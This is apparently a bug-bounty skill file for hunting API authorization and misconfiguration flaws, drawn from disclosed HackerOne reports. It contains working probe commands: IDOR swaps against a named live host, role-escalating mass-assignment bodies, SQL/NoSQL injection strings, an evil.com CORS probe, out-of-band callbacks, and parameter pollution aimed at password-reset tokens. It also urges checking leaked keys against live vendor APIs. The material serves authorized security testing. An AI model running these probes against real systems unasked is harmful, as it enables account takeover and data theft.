---
name: hunt-api
description: "Hunting skill for REST API / API misconfiguration vulnerabilities, built from a study pack of 533 assigned reports of which 371 full disclosed report texts were read in depth. Covers broken object-level authorization (IDOR/BOLA over user_id, application[id], accounts=, numeric and UUID references), missing server-side authorization on internal/admin/legacy endpoints, API-key and secret disclosure in JS bundles / git / APK / error messages / web archive, exposed specifications (Swagger/OpenAPI/NSwag) and GraphQL introspection, mass assignment, server-side parameter pollution in backend REST URL construction, CORS/cache-layer poisoning, HTTP verb tampering, request smuggling, GraphQL mutation-CSRF, resource-exhaustion DoS, link-preview/export SSRF, and OAuth redirect_uri misconfiguration. Detection is driven by two-account differential testing, response-shape analysis, and spec/introspection enumeration. Use when hunting any REST, REST-like, or GraphQL API surface."
sources: hackerone_public, topapi_lists, public_research, owasp_api_top10_2023
report_count: 533
full_reports_read: 371
---

## Crown Jewel Targets

API misconfiguration is highest-value where an endpoint returns data or performs an action that the caller is *not* entitled to, and the only thing standing in the way is a client-supplied identifier or a missing header. The 371 full reports cluster around a handful of repeat-offender surfaces. Prioritize:

- **Object-reference endpoints** that take `user_id`, `application[id]`, `accounts=`, `campaignId`, `id`, or a numeric/UUID path segment. The study pack's IDOR cluster (`#983070`, `#1695454`, `#1644436`, `#1061292`) shows a single swapped identifier moving an app to another account, exposing trading profit, or returning registration PII with no auth.
- **Internal / admin / legacy / undocumented endpoints** reachable without authentication — exposed Cortex metrics (`#1258871`), an unauthenticated Docker Registry API (`#347296`), a Kubernetes API (`#455645`), `fileCopy` GraphQL (`#981472`), and WordPress `/wp-json/wp/v2/users/` (`#197786`, `#1785021`).
- **Public JavaScript bundles, mobile APKs, git history, and web archives.** A huge fraction of "API" reports are really *credential* reports: keys in `main.*.js` (`#983331`, `#2923061`, `#1066410`), `strings.xml` (`#792850`), old Travis commits (`#1302395`), GitHub repos (`#1992261`, `#352623`), and `web.archive.org` CDX indexes (`#2380084`).
- **API documentation and introspection surfaces** — Swagger/OpenAPI/NSwag specs and GraphQL introspection (`#2886723`) hand you a complete attack map, including hidden routes and privileged field names.
- **Write endpoints that also accept "extra" fields** — profile/account/signup/token-regeneration DTOs are mass-assignment candidates (`#267781`), and update forms with deeply nested parameters (`application[id]`) are parameter-pollution candidates (`#1695454`).
- **Endpoints that fetch or proxy a URL** — batch/XSPA endpoints (`#751625`), link previews (`#1960765`), export APIs (`#3165242`), screenshot/render pipelines (`#1418891`, `#2846011`), and redirect-link shorteners (`#1066410`).
- **State-changing endpoints with weak CSRF** — GraphQL mutations over GET (`#1122408`), OAuth authorize endpoints (`#215381`, `#850022`), and `/signup/email` (`#419891`).
- **Anonymous-heavy frameworks** — WordPress REST (`show_in_rest`), Nextcloud, Rocket.Chat, GitLab, Automattic/WP-JSON, and mobile-backend APIs recur because they expose rich object graphs by default.

Severity ceiling: cross-account data theft, account takeover via leaked tokens/reset data (`#1342088`, `#810880`, `#1695454`), admin creation (`#836081`), or RCE through an exposed management API (`#455645`, `#1418891`, `#347296`).

### Impact Multipliers — what turns a "medium" into a critical

- **The leaked object is itself a credential.** `application[id]` IDOR only becomes critical because the error page exposed a Client ID/Secret (`#1695454`); an API token leaked through an applications endpoint enabled broad account actions. Hunt for fields named `token`, `secret`, `passwordResetToken`, `client_secret`, `access_token`, `api_key` in every response.
- **The operation is state-changing, not just read.** An outsider affecting a private subreddit's upvote percentage (`#1298902`) or adding a private circle to another circle (`#3511998`) is still an authorization failure — quantify how the victim's state is altered.
- **The endpoint is anonymous.** `#1061292` returned registration PII and attachments with no JWT; `#347296` let anyone dump and poison Docker images. Lack of auth removes the "needs an account" severity discount.
- **The identifier is enumerable.** Sequential `user_id`s (`#983070`), numeric registration IDs (`#1061292`), and predictable WP user IDs (`#1785021`) turn one IDOR into a mass-harvest primitive. State how many IDs are reachable.
- **The response contains more than the UI shows.** `#902733` returned all waitlist mobile numbers from an endpoint whose UI showed only a position; `#1080437` exposed message read status that the webapp deliberately hid. Always diff the API response against the rendered UI.

### Deprioritize / Close-Out Quickly

- A public endpoint returning dummy or "minuscule" data with no sensitive fields was closed as low-impact in `#307050` — right-size the report.
- A Swagger UI or GraphQL introspection page that is *intended* behavior was closed as such on Shopify (`#2886723`); confirm the program's stance before reporting spec exposure alone.
- Hardcoded *public* API keys (Stripe publishable, Google Maps browser keys) are often intended to be public (`#792850`, `#797636`). Focus on secret keys, server tokens, and keys with write scope or billing impact.
- Out-of-scope assets still get closed even when technically interesting (the IDRAC instance in `#187025`). Confirm scope first.

---

## Attack Surface Signals

### URL Patterns to Hunt
```
/api/v1/users/{id}                 /api/v2/users/{id}/...
/api/v1/store/whitelist            /v3/personal_area/stats/*?accounts=
/wp-json/wp/v2/users/              /wp-json/wp/v2/users/{id}
/wp-json/                          /?rest_route=
/graphql                           /api/graphql               /api/v1/graphql
/api/unstable/graphql.json         /admin/internal/web/graphql/core
/odata/                            /_api/data/                /api/data/v9.x/
/swagger                           /swagger/v1/swagger.json   /openapi.json
/v2/api-docs                       /v3/api-docs               /docs
/api/waitlist/us                   /api/2fa/verify            /api/2fa
/api/applications                  /api/as/v1/credentials/
/api/v1/chat.postMessage           /api/v1/store/whitelist
/campaign-manager-api/.../:campaignId/accountCredits
/user/tams/api/usermgmnt/pendingUserDetails/{REGISTRATION_ID}
/_matrix/media/r0/preview_url/?url=   /api/vote
/oauthAuthorize                    /oauth?client_id=...&redirect_uri=
```

### Parameter / Field Names to Hunt
```
user_id       userId       application[id]   accounts=      campaignId
registration_id  attachment_id  id             monitor_id     target_id
org_id        tenant_id    role              isAdmin        verified
api_key       apiKey       token             consumer_key   consumer_secret
url           uri          endpoint          src            redirect_uri
configUrl     query        search            ref            scope
```

### JS / Source Patterns
```javascript
// Bundle recon — look for embedded credentials and API call construction
apiKey: "AI..."            youtubeApiKey: "..."       aviaryApiKey: "..."
firebasedynamiclinks.googleapis.com/v1/shortLinks?key=...
window.ShopifyAPI.setWindowLocation / remoteRedirect / pushState
ShopifyApp.init({ shopOrigin: ... })          postMessage({ message: ... })
fetch('/api/internal/' + userInput)           XMLHttpRequest('POST','/oauthAuthorize')
graphql: query { ... } / mutation { ... }     introspection { __schema }
```

### Response / Header Signals
```
Content-Type: application/json on an unexpected route
"swagger" or "openapi" in a 200 JSON body
OData-Version: 4.0 / DataServiceVersion: 3.0
Access-Control-Allow-Origin: <reflected Origin> + Access-Control-Allow-Credentials: true
Cache-Control + an echoed Origin (poisonable shared cache — #591302)
WWW-Authenticate / Authorization: Basic <base64> appearing in captured traffic
Verbose errors naming internal field names ("Name must be provided", "Invalid route")
X-Powered-By / Server headers naming a framework with a default doc route
```

### Tech-Stack Signals
- **WordPress / WP-JSON / bbPress** — `show_in_rest => true` exposes users and private forum content (`#3801107`, `#197786`).
- **GitLab / GitHub / Rocket.Chat / Mattermost / Nextcloud** — rich REST + GraphQL + search APIs with a long history of IDOR and CSRF findings.
- **Shopify** — Embedded SDK `postMessage` APIs, internal GraphQL, and huge app ecosystems (`#422043`, `#981472`, `#662083`).
- **ASP.NET / SAP / Dynamics / SharePoint OData** — `$filter`, `$select`, `$orderby`, `$batch` surfaces need blacklist-bypass probing (see domain ref).
- **AWS Cognito / OAuth2 AS** — check `redirect_uri` validation and implicit grants (`#1342088`, `#3955956`).
- **Node.js fetch / Go / Python REST backends** — default doc routes and permissive body binding.

### Error Messages and Response Shapes Worth Chasing

```
"Name must be provided" + a full object page        -> #1695454 field disclosure
"Invalid route" / "consult the API definition"      -> server-side REST URL router
"unsupported field" / "API definition"              -> spec enumeration via ../
"undefined" appearing as a parameter in a response  -> #473742 cross-user data
"AccessToken"/"IdToken"/"RefreshToken" in a login response -> #1342088 token reuse
"Cortex config" / "/debug/pprof/cmdline"            -> #1258871 unauthenticated ops
HTTP 401 on a link-local address where all else is 200 -> metadata service answering
Different status/length for one internal IP vs others -> blind enumeration oracle
```

### Framework Default Routes and What They Expose

```
/graphql, /graphiql, /playground, /altair, /voyager  -> schema + field names
/swagger, /swagger-ui, /swagger-ui.html, /api-docs  -> full endpoint map
/openapi.json, /.well-known/openapi.json, /q/openapi -> spec (Quarkus)
/v2/api-docs, /v3/api-docs, /swagger-resources       -> Springfox / springdoc
/docs, /redoc                                        -> FastAPI / Connexion (Python)
/nswag, /api/swagger, /api/openapi.json              -> NSwag / Swashbuckle (.NET)
/wp-json/wp/v2/users/                                -> WordPress user enumeration
/_api/data/, /odata/, /api/data/v9.x/, /sap/opu/odata/ -> OData query operators
```

Treat any 200 JSON response from these paths as a lead: `jq '.paths | keys'` immediately yields the route list, and `jq '.components.schemas'` yields the mass-assignment field candidates. Banner the Swagger UI HTML for a version string to map it to the known spec-injection / DOM-XSS CVEs referenced in the domain ref.

---

## Discovery Patterns From 371 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **Enumerate the API itself (`api-endpoint`, 366/371).** What to look for: every route under `/api/`, `/v1/`, `/v2/`, `/internal/`, `/admin/`, `/graphql`, `/wp-json/`. Start from captured traffic (Burp history of the real client), then a spec/introspection dump. The dominant finding class is a route that exists but was never access-reviewed.
2. **Search / filter / sort parameters (`search-filter-sort`, 124).** What to look for: `search`, `scope`, `ref`, `filter`, `sort`, `query`, `$filter`. These become command injection (`#682442` `ref=--no-index`), SQLi (`#435066`), NoSQL injection (`#1130874`), or mass record disclosure (`#460815`).
3. **Admin / internal / undocumented surfaces (`admin-internal`, 86).** What to look for: `/internal/`, `/admin/`, `/debug/`, `/config`, `/debug/pprof/`, port 5000/8080 on adjacent hosts. `#1258871` exposed Cortex config and Go pprof; `#347296` found Docker Registry on port 5000 of the build host.
4. **Image-processing and server-side rendering (`image-processing` 76, `server-side-rendering` 76).** What to look for: upload/render/screenshot/convert endpoints; SVG and template inputs. `#2846011` (malicious graphie SVG), `#1418891` (Flink job API), `#219957` (attachment `image_url` → stored XSS).
5. **Anything with a filter or allowlist (`filter-bypass`, 72).** What to look for: scheme checks, origin checks, regex rules, role checks, and "fixed" endpoints where one scope was patched but a sibling was not — `#682442` explicitly notes `wiki_blobs` was fixed while `blobs` remained vulnerable.
6. **Public code search (`public-code-search`, 63).** What to look for: GitHub/GitLab repos, old commits, `.travis.yml`, `strings.xml`, APK decompiles, keyhacks. `#1302395` used TruffleHog on an encoded Sauce Labs key; `#1785145` found a Jira token in a Kotlin `Constants` object.
7. **XML parsers / import features (`xml-parser` 62, `import-feature` 10).** What to look for: `application/xml` bodies, external entities, CSV/DSPL remote schemas, and endpoints that parse user-supplied XML before auth.
8. **Cookie and session handling (`cookie-handling` 60, `session-attack` 50).** What to look for: cookies set from query params (`#1005421` `consumer_key`/`consumer_secret` → cookie), stale tokens after ban/deletion (`#1577940`), and revoked users retaining API access.
9. **Redirect handling (`redirect-handling` 55) and open redirects (`open-redirect` 10).** What to look for: `redirect_uri`, `link=`, `Location`, shortener regex rules. `#1066410` turned a leaked Firebase key + bad regex into arbitrary redirect.
10. **JavaScript source review (`js-source-review`, 41).** What to look for: bundles containing keys, hidden endpoints, and client-side message handlers. `#983331`, `#2923061`, `#1066410`, `#902733` all started by reading a `main.*.js` file.
11. **CORS / cache layer (`cors-misconfig` 16, `cache-layer` 48).** What to look for: reflected `Origin` with credentials, especially on cacheable GETs (`#591302`).
12. **CSRF surfaces (`csrf`, 41).** What to look for: state-changing GETs, OAuth authorize POSTs without `authenticity_token`, and JSON endpoints relying only on content-type (`#419891`, `#215381`, `#1122408`).

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

| Rank | Signal (reports) | Why it matters | What to probe |
|---|---|---|---|
| 1 | api-endpoint (366) | The surface itself is the bug class; undocumented routes are untested routes | Diff two accounts across every route; replay as admin and as low-priv |
| 2 | search-filter-sort (124) | Raw parameters reach backend queries/commands | Inject `--no-index`, `'`, `$where`, `$filter`, long/unicode terms |
| 3 | admin-internal (86) | Often exposed with no auth at all | `/admin`, `/internal`, `/config`, `/debug/pprof`, adjacent ports |
| 4 | image-processing (76) | Parsers and renderers execute attacker content server-side | SVG `onload`, malformed images, template fragments, large payloads |
| 5 | server-side-rendering (76) | Server fetches/renders on your behalf → SSRF/XSS/DoS | `url=`, `image_url`, template injection, headless render callbacks |
| 6 | filter-bypass (72) | A patched control usually has an unpatched sibling | Re-test every scope/role/path variant after a fix |
| 7 | public-code-search (63) | Secrets leak outside the app entirely | GitHub search, TruffleHog, git history, APK decompile |
| 8 | xml-parser (62) | XXE and parser DoS on unauthenticated imports | `<!DOCTYPE ... SYSTEM "file:///...">`, entity expansion |
| 9 | cookie-handling (60) | Cookies/banners set from request input enable client-side state attacks | `consumer_key=x; domain=...; Max-Age=...` style params |
| 10 | comment-injection (58) | Stored payloads land in API responses viewed by others | HTML/JS in comments, titles, attachment fields |
| 11 | redirect-handling (55) | Client and server disagree on destination validation | `redirect_uri`, `?link=`, shortener regex fuzzing |
| 12 | session-attack (50) | Token lifecycle bugs survive logout/ban/delete | Reuse API keys after ban; test deleted-account access |
| 13 | sso-oauth (49) | OAuth token minting is a direct ATO primitive | Cognito token misuse, authorize CSRF, redirect_uri validation |
| 14 | cache-layer (48) | Shared caches turn one poisoned response into many victims | Echo `Origin` into ACAO on a cacheable GET |
| 15 | json-body (48) | Body binders accept undocumented fields | Add `role`, `isAdmin`, `verified`, `tenantId` to PATCH/PUT |
| 16 | brute-otp-reset (47) | Missing throttling on OTP/token/key regeneration | Rapid-fire regenerate/reset; compare `oc_bruteforce_attempts` |
| 17 | dos-resource (46) | Cheap requests exhaust CPU/memory | Near-infinite loops, mutation aliasing, large resources |
| 18 | misconfiguration (42) | Default config left enabled in production | Exposed metrics, specs, pprof, debug routes |
| 19 | js-source-review (41) | Bundles leak keys and hidden endpoints | Grep every `*.js` for `key`, `token`, `api`, `graphql` |
| 20 | csrf (41) | State changes ride the victim's session | GET mutations, OAuth POST w/o token, JSON CSRF |
| 21 | url-fetching (37) | Server-side fetches are SSRF/XSPA sinks | `url=`, batch endpoints, preview APIs, export APIs |
| 22 | internal-network (36) | Internal services exposed by mistake or via SSRF | Port scan adjacent hosts; look for unauthenticated admin panels |
| 23 | blind-oob (25) | No response body; needs OOB confirmation | Collaborator/interactsh callback per parameter |
| 24 | cloud-metadata (24) | IMDS credentials turn SSRF into cloud compromise | Attempt metadata endpoints only in scope |
| 25 | idor-object-ref (21) | Direct object reference with no ownership check | Swap sequential IDs and UUIDs across two accounts |
| 26 | graphql (20) | Introspection + over-permissive resolvers | `__schema`, nested queries, mutation aliases |
| 27 | cors-misconfig (16) | Reflect-any-origin enables credentialed reads | `Origin: https://evil.com` + credentials |
| 28 | mutation-polyglot (13) | One value parsed differently by each layer | Mixed encodings, `;/`, path tricks, polygot payloads |
| 29 | path-traversal-lfi (11) | Spec/route reached via traversal | `../` to `/swagger.json` from a vulnerable backend route |
| 30 | subdomain-takeover (18) | Dangling DNS hands you a trusted origin | Check `api.*`, CNAME/NS records for unclaimed services |

### Reading the Frequency Table

The counts are the number of full reports whose text contained that signal, so a single report contributes to multiple rows. Read them as *where researchers look and what they find*, not as a vulnerability census. Three takeaways:

- **`api-endpoint` (366) vs `idor-object-ref` (21).** Almost every API report mentions an endpoint, but far fewer name the specific object-reference bug. That gap is your opportunity: most reports settle for "information disclosure" without isolating the ownership check that failed. Isolate the check and the fix is obvious.
- **The recon triad — `public-code-search` (63), `js-source-review` (41), `wayback-machine` (2).** A large share of API findings are made without ever sending a malicious request to the application. Budget real time for static recon; the key-hack cluster (`#983331`, `#2923061`, `#1302395`, `#1992261`, `#2380084`) is almost pure grep work.
- **The "boring" middle matters.** `cookie-handling` (60), `comment-injection` (58), `redirect-handling` (55), and `cache-layer` (48) are more frequent than the headline classes like `ssrf` or `graphql`. These are the low-effort, high-yield checks that produce steady results.

### Negative Results and Dead Ends (lessons from the corpus)

- A reflected URL in an error string is not a server-side fetch. Several SSRF-adjacent reports hinge on distinguishing formatting from actual network requests; the blind SSRF cases (`#895696`, `#1960765`) needed OOB confirmation.
- A `200 OK` on `__proto__` or an extra field is not proof of a bug — you must show the polluted/assigned value reaching a later sink or a changed privileged state (domain ref).
- "Intended behavior" is a real outcome: GraphQL introspection on Shopify was closed as such (`#2886723`), and public publishable keys are expected in client bundles.
- Some strong reports were invalidated by scope: `#187025` targeted an out-of-scope IDRAC instance, and several key leaks concerned third-party vendor keys rather than the program's own infrastructure.
- A disclosed key that is revoked or points at a defunct service is not a live finding — `#1047125` explicitly tested which keys still worked and noted Aviary was defunct.

### Verbatim Discovery Clues (18 real `[#id]` quotes)

> **[#1065041]** I found a bunch of endpoints that is leaking you Google Api key.

> **[#422043]** Inspired by #381192, I decided to check all pages to see if there's any broken origin validation.

> **[#981472]** jack_mccracken is a skilled attacker he found an undocumented GraphQL API called `fileCopy`, he used this API to try to copy a file from his store `StorB` to `StoreA` (where he is a staff member).

> **[#983331]** I found a sensitive data including authentication key written in public accessible javascript file.

> **[#196655]** I have found a security vulnerability that allows an attacker to disclose any user's private email.

> **[#810880]** I found 2 vulnerabilities in your 2FA implementation:

> **[#1694304]** However, I noticed any user can like the Twitter Circle tweets by modifying the "like" request.

> **[#1122408]** The bug I found here was that, when we send a GET request, the backend does not expect the X-CSRF-Token header.

> **[#347296]** While digging into the environment that hosts the sandboxed build container, I came across the port 5000 open on another machine (probably the host), which is used for Docker Registry (https://docs.

> **[#1695454]** I created an API application and tried to update it, I saw this request :

> **[#1695454]** So I tried to escalate its impact and I noticed if we remove all parameters except `application[id]` and `authenticity_token`, then send the request, the endpoint gives an error with `Name must be provided` and prints the given application ID's page.

> **[#232650]** I tried to intercept traffic between starbucks app and server with burp suite.

> **[#249319]** I discovered that the Federalist API doesn't have rate limiting in place, and executes any amount of request to the endpoint in parallel mode.

> **[#1047125]** The API keys from Aviary and YouTube are disclosed in that report, and I tried using these API keys, and found out that they can still be used to fetch response from YouTube's API using Stripo's disclosed API key.

> **[#1130874]** [+] Found admin: username=admin id=56gyPQKt8Ff3Weowk

> **[#764243]** Then i was able to trace application http traffic, and since API data is not encrypted and there's nothing protect API such as token.

> **[#227230]** In testing out the API web hooks, I noticed that the scoping permissions only allow API credentials to create web hooks for those actions which are enabled with at least read permissions.

> **[#1394982]** During the testing, I've created Test111 partner account, trying to escalate the issue, however can't find an option to delete it :| So far I did receive some DNS interaction on my collaboration server, but I've decided to stop tes

### Probe Checklist (15 concrete probes)

1. Create **two accounts** (A and B). Capture A's legitimate request to every object endpoint; swap A's `id`/`user_id`/`accounts=`/`application[id]` for B's and compare responses (`#983070`, `#1644436`).
2. Replay the same request **without any auth header/cookie** — many internal APIs return full data anonymously (`#1061292`, `#347296`, `#455645`, `#197786`).
3. Hit `/wp-json/wp/v2/users/`, `/wp-json/wp/v2/users/1/`, and `?rest_route=/wp/v2/users` and check for usernames/emails (`#197786`, `#1785021`, `#335341`).
4. Request the spec/introspection: `/swagger/v1/swagger.json`, `/openapi.json`, `/v3/api-docs`, and a GraphQL `{ __schema { types { name } } }` query (`#2886723`).
5. On an update endpoint, **strip all fields except the object ID + CSRF token** and observe the error page for leaked field values (`#1695454`).
6. Add privileged fields to a JSON body: `{"role":"admin","isAdmin":true,"verified":true,"tenantId":...}` (`#267781`).
7. Try **GET instead of POST** on GraphQL and other state-changing routes; check whether the CSRF token is skipped (`#1122408`).
8. Try `X-HTTP-Method-Override`, `PATCH`, and `_method=GET` to bypass method-based authorization (`#2149124`, `#384782`).
9. Send `Origin: https://evil.com` on a cacheable GET and check `Access-Control-Allow-Origin` + credentials, then re-request without Origin to check poisoning (`#591302`).
10. Grep every JS bundle and APK resource for `key`, `token`, `secret`, `apiKey`, `client_id`; validate found keys against the vendor API (`#983331`, `#2923061`, `#792850`).
11. Search GitHub / git history / web archive CDX for the company name + `api_key`, `token`, `.travis.yml`, `strings.xml` (`#1302395`, `#1992261`, `#2380084`).
12. Test a URL-accepting parameter with a unique Collaborator/interactsh callback; attribute each candidate parameter with its own payload (`#895696`, `#1960765`, `#751625`).
13. Probe OTP/reset/token-regeneration endpoints with 30 rapid requests and compare status codes (`#243619`, `#766875`).
14. For search scopes, try flag-like values (`--no-index`, `-h`) and SQL/NoSQL metacharacters (`'`, `$where`) (`#682442`, `#1130874`, `#435066`).
15. For OAuth, test `redirect_uri` structure/scheme and CSRF on the authorize endpoint; attempt implicit-grant token delivery to an attacker URI in scope (`#215381`, `#850022`, `#3955956`).

### Interpreting the probes — positive vs negative outcomes

| Probe | Positive signal | Negative / noise |
|---|---|---|
| #1 ID swap | 200 with B's fields | Same as A → real ownership check exists |
| #2 no auth | Sensitive body returned | 401/403 consistently |
| #3 WP users | Emails/slugs enumerated | 404 or single self record |
| #4 spec/introspection | Rich schema with hidden routes | Intended-behavior closure |
| #5 strip fields | Error page leaks B's secret | Generic validation error |
| #6 extra fields | Role/flag persisted | Field silently ignored |
| #7 GET mutation | State changed without token | CSRF enforced on all verbs |
| #8 method override | Authorization skipped | Consistent 405/403 |
| #9 CORS + cache | Reflected ACAO cached for others | Static allowlist |
| #10 bundle grep | Live privileged key | Publishable/defunct key |
| #11 git/archive | Valid secret in history | Revoked or dummy value |
| #12 OOB callback | DNS/HTTP hit tied to one param | Echo-only error message |
| #13 throttle | 30/30 processed or counter resets | 429 with backoff |
| #14 query injection | Error/time/flag-based data leak | Escaped literal string |
| #15 redirect_uri | Arbitrary URI receives token | Strict exact-match allowlist |

Run the negative controls deliberately — they are evidence. When a parameter produces no callback, no cross-account response, or no state change, record it: it tells the triage team which field is actually trusted and prevents a fix aimed at the wrong sink.

---

## Step-by-Step Hunting Methodology

1. **Build the route inventory.** Passive capture the real client (browser and mobile app) through an intercepting proxy. Combine with spec/introspection enumeration (`/swagger*`, `/openapi.json`, `/v3/api-docs`, `/docs`, GraphQL introspection) and directory brute force on subdomains. `#895172` found the path by checking "other subdomains in search of something to help me continue, use Dirb, Dirsearch, etc."

2. **Classify every endpoint** as read/list, detail-by-ID, create, update, delete, or state-transition. Mark which ones take an object identifier and which require a CSRF token. The IDOR cluster is overwhelmingly detail/update endpoints (`#983070`, `#1644436`, `#1695454`).

3. **Run the two-account differential.** For each detail/update endpoint, swap identifiers between accounts A and B. Record status code, response length, and field names. A 200 with B's data is a finding; a different error shape is a lead. `#1694304` chained an unreadable "like" action with a data-export endpoint to finally *see* the protected object.

4. **Test authentication boundaries.** Replay as anonymous, as a banned/deleted user (`#1577940`), as a revoked user (`#962604`), and as a low-privileged role (`#981472`, `#836081`, `#239719`). Look for endpoints that trust a client-supplied role or organization ID.

5. **Mine the client and code repositories** for secrets and hidden routes. Decompile APKs, grep bundles, search GitHub and web archives. Validate every discovered key against the live vendor API — disclosed keys often remain valid (`#1047125`) or are over-scoped (`#118925`, `#3670955`).

6. **Probe object-binding and verb handling.** Add undocumented fields to JSON bodies; try form vs JSON encodings; try GET/HEAD/PATCH/override methods. Confirm whether authorization decorators are applied uniformly (`#2149124`, `#1122408`, `#267781`).

7. **Probe server-side URL construction** when a frontend form calls a backend API on your behalf. Inject `#`, `?`, `../`, `%23`, `%2f` into the username/ID and watch for "Invalid route" / "API definition" errors that reveal a REST router; walk the spec via traversal to find valid field names, then target `passwordResetToken`-style fields (domain ref; `#473742` shows an `undefined` parameter returning other users' address books).

8. **Test CORS and caching together.** Reflect an arbitrary Origin, check credential headers, then check whether the poisoned response is served to other users from cache (`#591302`).

9. **Fuzz state-change and rate-limit surfaces.** Repeatedly fire regeneration, reset, vote, and OTP endpoints; compare counters and error states (`#880187`, `#243619`, `#249319`, `#1298902`).

10. **Test URL-accepting features for SSRF/XSPA** with per-parameter OOB payloads, and test file/render/import endpoints with benign marker content first (`#895696`, `#1960765`, `#751625`, `#2846011`).

11. **Check redirect and OAuth flows** for structural validation gaps: arbitrary `redirect_uri`, missing state/CSRF, implicit grants, and token leakage in references/logging (`#215381`, `#3955956`, `#541760`).

12. **Escalate the primitive.** A low-impact IDOR becomes critical when the leaked object is an API token (`#1695454`) or reset/2FA secret (`#810880`, `#2635315`). A "minor" exposed endpoint becomes RCE when it is a management API (`#455645`, `#1418891`, `#347296`).

13. **Document two perspectives** — attacker request/response and victim-account impact — with the exact identifiers changed, plus timing/counters for DoS and OOB callbacks for SSRF.

### Test-data setup (do this once, reuse across every step)

- Create accounts A and B with known, recordable object IDs. For APIs that expose a "me" endpoint (`/api/v1/s/user/me`, `/api/v1/users/{id}`), record each account's canonical ID first (`#983070`).
- Where an object must be shared (a report, a project, a circle), create it under A and invite B so both can legitimately reference the same resource — then swap the reference in B's request (`#196655`, `#1694304`).
- Keep a low-privileged/staff account and, if the program allows, a banned/revoked account to test lifecycle boundaries (`#981472`, `#1577940`, `#1479894`).
- Maintain a clean "baseline" response for every endpoint so a changed field or extra field is obvious.

### Evidence to capture per finding

- Full raw request and response with the identifier highlighted, plus the same request with the victim's identifier.
- The authorization boundary that failed: which header/role/cookie was present or absent.
- A count of reachable objects (IDs enumerated, records returned, `Content-Length` of a list response).
- For DoS: request count, timing, and server error behavior (`#880187`, `#249319`).
- For OOB: the exact unique callback, timestamp, and the parameter that produced it — one payload per parameter (`#895696`).

---

## Payload & Detection Patterns

### Two-account IDOR / BOLA differential
```bash
# Account A owns id 1001; account B owns 2002
GET /v3/personal_area/stats/equity?time_range=365&accounts=2002 HTTP/2
Host: my.exness.com
Authorization: Bearer <A_TOKEN>

# Application-object IDOR (body parameter, nested field name)
POST /api/v1/store/whitelist HTTP/1.1
{"user_id":2002, "name":"attacker-app"}

# Deeply nested object reference from #1695454
POST .../api/applications HTTP/1.1
application[id]=<VICTIM_ID>&authenticity_token=<TOKEN>

# Strip fields to force an error page that discloses the object
application[id]=<VICTIM_ID>&authenticity_token=<TOKEN>
# -> "Name must be provided" + page with Client ID / Client Secret
```

### Anonymous / admin route probing
```bash
curl -s https://target/api/v1/users/2002 | jq .
curl -s https://target/wp-json/wp/v2/users/ | jq '.[].slug,.[].email'
curl -s 'https://target/wp-json/wp/v2/users/1'
curl -s 'https://target/?rest_route=/wp/v2/users'
curl -s https://target/user/tams/api/usermgmnt/pendingUserDetails/2634   # no auth
curl -s https://target/config ; curl -s https://target/debug/pprof/cmdline?debug=1
```

### Spec / introspection enumeration
```bash
for p in swagger/v1/swagger.json openapi.json v3/api-docs v2/api-docs \
         api/swagger.json swagger-resources docs q/openapi; do
  curl -s -o /tmp/spec -w "$p %{http_code} %{content_type}\n" "https://target/$p"
done
jq '.paths | keys' swagger.json
jq '.components.schemas | keys' swagger.json       # mass-assignment candidates

# GraphQL introspection
curl -s -X POST https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } types { name fields { name args { name } } } } }"}'
```

### Mass assignment / extra fields
```bash
curl -X PATCH https://target/api/users/me -H 'Content-Type: application/json' \
  -u "$USER" -d '{"name":"x","role":"admin","isAdmin":true,"verified":true,"tenantId":1}'
# Compare fields returned before/after; check if a free feature becomes enabled (#267781)
```

### Verb tampering
```bash
# GraphQL mutation via GET — CSRF token on POST is bypassed (#1122408)
curl -s 'https://target/api/graphql/?query=mutation%20CreateSnippet%28%24input%3A%20CreateSnippetInput%21%29%20%7B%20createSnippet%28input%3A%20%24input%29%20%7B%20errors%20%7D%20%7D'

curl -X GET https://target/api/account/destroy          # instead of DELETE
curl -X PATCH https://target/api/keys -H 'X-HTTP-Method-Override: PUT' -d '{"scope":"admin"}'
curl -s 'https://target/?_method=GET'
```

### CORS + cache poisoning
```bash
curl -s -D - -H 'Origin: https://evil.com' https://target/api/user/me -o /dev/null
# Look for: Access-Control-Allow-Origin: https://evil.com
#           Access-Control-Allow-Credentials: true
# Then re-GET without Origin to see if the reflected ACAO is cached (#591302)
```

### Search / query-parameter injection
```bash
curl --header "PRIVATE-TOKEN: $TOKEN" \
  'https://target/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index'   # #682442
curl -X POST 'https://target/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep(10)%3B--%27'  # #435066
curl -s 'https://target/users.list?query=%7B%22%24where%22%3A%22...%22%7D'      # #1130874
```

### Secret discovery and validation
```bash
# JS bundles
curl -s https://target/js/main.js | grep -Eo 'apiKey|api_key|token|secret|client_id' | sort -u
# Git history
trufflehog filesystem . --only-verified        # #1302395
gitleaks detect --source .
# Web archive CDX
curl -s 'https://web.archive.org/cdx/search/cdx?url=target.com/*&collapse=urlkey&output=text&fl=original' | grep -i 'client_id\|key'   # #2380084
# Validate a found key against the vendor API before reporting (#1047125)
```

### OOB detection for URL-fetching endpoints
```bash
interactsh-client -v
curl -s 'https://target/api/batch' -H 'Content-Type: application/json' \
  -d '{"url":"https://UNIQUE.oast.pro"}'      # #751625 batch/XSPA
# One payload per parameter; poll 30-120s; attribute callbacks individually (#895696)
```

### Request smuggling (when the front-end/origin stack permits)
```
CL.TE / TE.CL desync probes against api.* hosts; confirm by capturing another
user's request (Zomato X-Access-Token theft, #771666). Only in authorized scope.
```

### Discovery tooling
```bash
ffuf -w burp-parameter-names.txt -u 'https://target/api/v1/user?id=FUZZ' -mc 200
httpx -l subdomains.txt -path /swagger/v1/swagger.json,/openapi.json -mc 200
kiterunner scan swagger.json --target https://target
```

### Server-side parameter pollution in backend REST URL construction

Use when a frontend form (password reset, account lookup, stock check) calls a backend API on your behalf. The value is interpolated into a server-side path or query.

```
username=administrator%23                       # terminate backend URL with fragment
username=administrator%3f                       # switch path to query
username=administrator%2f..%2fvictimuser        # traverse inside the backend path
username=administrator/../victimuser
username=administrator/field/email%23
username=administrator/field/id%23
username=administrator/field/passwordResetToken%23
username=administrator%2ffield%2fpasswordResetToken%23
```

